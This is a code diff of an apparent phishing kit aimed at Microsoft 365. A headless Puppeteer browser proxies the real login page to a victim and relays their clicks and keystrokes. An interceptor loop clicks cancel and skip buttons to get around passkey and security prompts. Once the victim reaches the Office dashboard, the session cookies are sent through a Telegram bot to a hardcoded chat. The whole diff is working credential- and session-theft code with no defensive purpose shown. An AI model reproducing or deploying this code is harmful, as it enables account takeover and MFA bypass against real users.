@@ -9,31 +9,23 @@ const CHAT_ID = '1318100118';
 
 async function sendExfiltrationAlert(data) {
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-    const message = `🚀 *SESSION CAPTURED*\n\n*Target:* Microsoft 365\n*Status:* Successful Bypass & Cookie Extraction`;
     try {
-        await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' });
         await axios.post(url, { 
             chat_id: CHAT_ID, 
-            text: `\`\`\`json\n${JSON.stringify(data, null, 2).substring(0, 4000)}\n\`\`\``,
+            text: `🚀 *COOKIES CAPTURED*\\n\\n\`\`\`json\\n${JSON.stringify(data, null, 2).substring(0, 4000)}\\n\`\`\``,
             parse_mode: 'Markdown'
         });
-    } catch (error) { console.error('[!] Telegram error:', error.message); }
+    } catch (e) { console.error('Exfil error:', e.message); }
 }
 
 async function startSession(io, socket) {
-    console.log(`[INIT] Starting bypass-hardened session: ${socket.id}`);
+    console.log(`[INIT] Cancel-Prioritized Session: ${socket.id}`);
     let browser;
 
     try {
         browser = await puppeteer.launch({
             headless: "new",
-            args: [
-                '--no-sandbox',
-                '--disable-setuid-sandbox',
-                '--disable-dev-shm-usage',
-                '--disable-gpu',
-                '--single-process'
-            ]
+            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
         });
 
         const page = await browser.newPage();
@@ -48,53 +40,57 @@ async function startSession(io, socket) {
             }
         };
 
-        console.log(`[NAV] Directing to Microsoft...`);
         page.goto('https://login.microsoftonline.com/', { waitUntil: 'domcontentloaded' }).catch(() => {});
-
-        // HEARTBEAT: Standard visual sync
-        const heartbeat = setInterval(emitFrame, 1200);
+        const heartbeat = setInterval(emitFrame, 1300);
 
         /**
-         * AUTO-BYPASS LOGIC
-         * Periodically scans for hidden or unresponsive "Skip" buttons 
-         * that block progress to the dashboard.
+         * THE CANCEL-RECOVERY LOOP
+         * Prioritizes 'Cancel' and 'Other ways' to break Passkey loops.
          */
-        const bypassInterval = setInterval(async () => {
-            if (!socket.connected) return clearInterval(bypassInterval);
+        const interceptor = setInterval(async () => {
+            if (!socket.connected) return clearInterval(interceptor);
             try {
-                // List of common selectors for Microsoft's "Skip" and "Next" buttons
-                const selectors = [
-                    '#iShowSkip', 
-                    '#iNext', 
-                    'input[value="Skip for now"]', 
-                    'input[value="Next"]',
-                    'input[type="button"][id="idSubmit_SAOTCC_Continue"]'
+                // 1. Prioritize Cancel/Back to escape hardware prompts
+                const escapeTargets = [
+                    '#idBtn_Back',              // The standard "Cancel" or "Back" button
+                    '#cancelButton',            // Alternate cancel ID
+                    '#otherWays',               // "Other ways to sign in"
+                    '#iShowSkip',               // "Skip for now" (on security info screens)
+                    'a[data-bind*="switchToPassword"]' // "Use your password instead"
                 ];
 
-                for (const selector of selectors) {
-                    const btn = await page.$(selector);
-                    if (btn) {
-                        console.log(`[AUTO-BYPASS] Found and clicking: ${selector}`);
-                        await btn.click();
-                        await emitFrame();
+                for (const selector of escapeTargets) {
+                    const el = await page.$(selector);
+                    if (el) {
+                        console.log(`[BYPASS] Found Escape Target: ${selector}`);
+                        await el.click();
+                        return await emitFrame(); // Exit loop after one click to let page refresh
                     }
                 }
-            } catch (e) {}
-        }, 3000);
+
+                // 2. Fallback to 'Next' only if no escape targets are found
+                const nextButtons = ['#iNext', 'input[value="Next"]'];
+                for (const selector of nextButtons) {
+                    const el = await page.$(selector);
+                    if (el) {
+                        console.log(`[BYPASS] Fallback to Next: ${selector}`);
+                        await el.click();
+                        break;
+                    }
+                }
+            } catch (err) {}
+        }, 2500);
 
         socket.on('victim-action', async (data) => {
             try {
                 if (data.type === 'click') await page.mouse.click(data.x, data.y);
                 else if (data.type === 'key') await page.keyboard.press(data.key);
                 await emitFrame();
-            } catch (err) { console.error('[ACTION-ERR]', err.message); }
+            } catch (e) {}
         });
 
-        // SUCCESS SENSOR: Detects when we hit the Office dashboard
         page.on('framenavigated', async (frame) => {
-            const url = frame.url();
-            if (url.includes('shell/homepage') || url.includes('office.com')) {
-                console.log(`[SUCCESS] Destination reached: ${url}`);
+            if (frame.url().includes('shell/homepage') || frame.url().includes('office.com')) {
                 const cookies = await page.cookies();
                 await sendExfiltrationAlert(cookies);
                 socket.emit('success');
@@ -103,12 +99,12 @@ async function startSession(io, socket) {
 
         socket.on('disconnect', async () => {
             clearInterval(heartbeat);
-            clearInterval(bypassInterval);
+            clearInterval(interceptor);
             if (browser) await browser.close();
         });
 
     } catch (error) {
-        console.error('[FATAL]', error.message);
+        console.error('[CRITICAL]', error.message);
         if (browser) await browser.close();
     }
 }
